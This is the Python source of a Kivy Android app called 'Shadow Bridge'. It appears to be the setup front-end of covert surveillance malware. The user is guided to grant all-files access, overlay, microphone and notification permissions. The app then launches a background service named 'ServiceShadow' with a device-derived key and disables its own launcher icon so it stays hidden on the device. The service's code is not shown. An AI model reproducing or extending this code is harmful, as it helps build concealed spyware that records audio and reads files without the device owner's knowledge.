import subprocess
from time import sleep
from kivy.app import App
from jnius import autoclass
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
try: from android.permissions import request_permissions,Permission
except: pass

class ShadowBridge(App):
    def build(self):
        layout = BoxLayout(orientation="vertical",padding=50,spacing=20)
        # label
        self.label = Label(text="Shadow Bridge 🤖",font_size=40,color=(0,1,0,1))
        layout.add_widget(self.label)
        # key btn
        self.show_key_btn = Button(text="Show Root Key",font_size=25)
        self.show_key_btn.bind(on_press=self.show_root_key)
        self.show_key_btn.disabled = False
        layout.add_widget(self.show_key_btn)
        # storage btn
        self.storage_permission_btn = Button(text="Give Storage Permission",font_size=25)
        self.storage_permission_btn.bind(on_press=self.storage_permission)
        self.storage_permission_btn.disabled = True
        layout.add_widget(self.storage_permission_btn)
        # overlay btn
        self.overlay_permission_btn = Button(text="Give Overlay Permission",font_size=25)
        self.overlay_permission_btn.bind(on_press=self.overlay_permission)
        self.overlay_permission_btn.disabled = True
        layout.add_widget(self.overlay_permission_btn)
        # popup btn
        self.popup_permission_btn = Button(text="Give Mic,Notification Permission",font_size=25)
        self.popup_permission_btn.bind(on_press=self.popup_permission)
        self.popup_permission_btn.disabled = True
        layout.add_widget(self.popup_permission_btn)
        # start btn
        self.start_btn = Button(text="Start Shadow",font_size=25)
        self.start_btn.bind(on_press=self.start_shadow)
        self.start_btn.disabled = True
        layout.add_widget(self.start_btn)
        # disable btn
        self.disable_btn = Button(text="Disable Icon",font_size=25)
        self.disable_btn.bind(on_press=self.disable_icon)
        self.disable_btn.disabled = True
        layout.add_widget(self.disable_btn)
        return layout

    def show_root_key(self,instance):
        try:
            self.root_key = f"{subprocess.getoutput('getprop ro.product.brand').strip().lower().split()[0]}:{subprocess.getoutput('getprop ro.build.version.release').strip().lower().split()[0]}xx"
            instance.text = f"Root Key: {self.root_key}"
            self.show_key_btn.disabled = True
            self.storage_permission_btn.disabled = False
        except Exception as error: instance.text = f"Show Key Error: {error}"

    def storage_permission(self,instance):
        try:
            instance.text = "Getting Storage Permission..."
            self.Uri = autoclass("android.net.Uri")
            self.Intent = autoclass("android.content.Intent")
            self.Settings = autoclass("android.provider.Settings")
            self.activity = autoclass("org.kivy.android.PythonActivity").mActivity
            self.package_name = self.activity.getPackageName()
            intent = self.Intent(self.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
            intent.setData(self.Uri.parse("package:" + self.package_name))
            self.activity.startActivity(intent)
            self.storage_permission_btn.disabled = True
            self.overlay_permission_btn.disabled = False
        except Exception as error: instance.text = f"Storage Permission Error: {error}"
    
    def overlay_permission(self,instance):
        try:
            instance.text = "Getting Overlay Permission..."
            intent = self.Intent(self.Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
            intent.setData(self.Uri.parse("package:" + self.package_name))
            self.activity.startActivity(intent)
            self.overlay_permission_btn.disabled = True
            self.popup_permission_btn.disabled = False
        except Exception as error: instance.text = f"Overlay Permission Error: {error}"

    def popup_permission(self,instance):
        try:
            instance.text = "Getting Mic,Notification Permission..."
            request_permissions([Permission.RECORD_AUDIO,Permission.POST_NOTIFICATIONS])
            self.popup_permission_btn.disabled = True
            self.start_btn.disabled = False
        except Exception as error: instance.text = f"Mic,Notification Permission Error: {error}"

    def start_shadow(self,instance):
        try:
            instance.text = "Shadow's Running..."
            ServiceClass = autoclass(f"{self.package_name}.ServiceShadow")
            ServiceClass.start(self.activity,self.root_key)
            self.start_btn.disabled = True
            self.disable_btn.disabled = False
        except Exception as error: instance.text = f"Starting Service Error: {error}"

    def disable_icon(self,instance):
        try:
            instance.text = "Icon Disabling..."
            PackageManager = autoclass("android.content.pm.PackageManager")
            pm = self.activity.getPackageManager()
            pm.setApplicationEnabledSetting(self.package_name,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP)
            self.disable_btn.disabled = True
        except Exception as error: instance.text = f"Icon Disabling Error: {error}"

ShadowBridge().run()
